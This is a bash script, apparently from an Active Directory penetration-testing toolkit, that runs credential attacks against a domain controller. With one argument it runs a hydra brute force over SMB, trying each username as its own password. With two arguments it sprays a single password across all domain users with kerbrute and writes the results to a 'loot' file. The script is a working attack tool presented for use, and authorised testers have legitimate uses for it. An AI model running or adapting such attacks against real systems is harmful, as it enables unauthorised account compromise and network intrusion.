#!/bin/bash

SCRIPT_PATH=$(readlink -f "${BASH_SOURCE[0]}")
SCRIPT_DIR=$(dirname "$SCRIPT_PATH")
AD_HELPER="${SCRIPT_DIR}/ad-helper.sh"

source "$AD_HELPER" || exit
is_workspace_directory || exit

function print_usage_spray {
    print_info "Usage: ${0} <DOMAIN> [PASS]"
    print_info "For a spraying attack, specify a password."
}

if [ $# -gt 0 ]
then
    init_ad_users_file $1 || exit
    user_file=$(get_ad_users_filename $1) || exit
    dc_ip=$(get_dc_for_domain $1 3) || exit
    user_count=$(wc -l $user_file | awk '{ print $1 }')
    domain_fqdn=$(db_select "$DB_TABLE_DOMAIN" "$1" | cut -d'|' -f3)
    domain_name=$(echo "${1}" | awk '{ print tolower($1)}')

    if [ $# -eq 1 ]
    then
        print_info "Performing LOGIN=PASS bruteforce on ${user_count} users against DC with IP ${dc_ip}..."
        command="hydra -L '${user_file}' -e s 'smb://${dc_ip}'"
    elif [ $# -eq 2 ]
    then
        print_info "Performing spraying attack on ${user_count} users against DC with IP ${dc_ip}..."
        # command="hydra -L '${user_file}' -p '${2}' 'smb://${dc_ip}'"
        command="kerbrute -users '${user_file}' -password '${2}' -domain '${domain_fqdn}' -dc-ip '${dc_ip}' -no-save-ticket -outputfile './loot/${domain_name}_kerbrute.txt'"
    elif [ $# -ge 3 ]
    then
        print_error "Invalid number of arguments: ${#}"
        print_usage_spray && exit
    fi

    print_info "Command to execute: ${COLOR_CYAN_BOLD}${command}${COLOR_RST}"
    prompt_confirm || exit

    exec_and_log "${command}"
    
else
    print_usage_spray
fi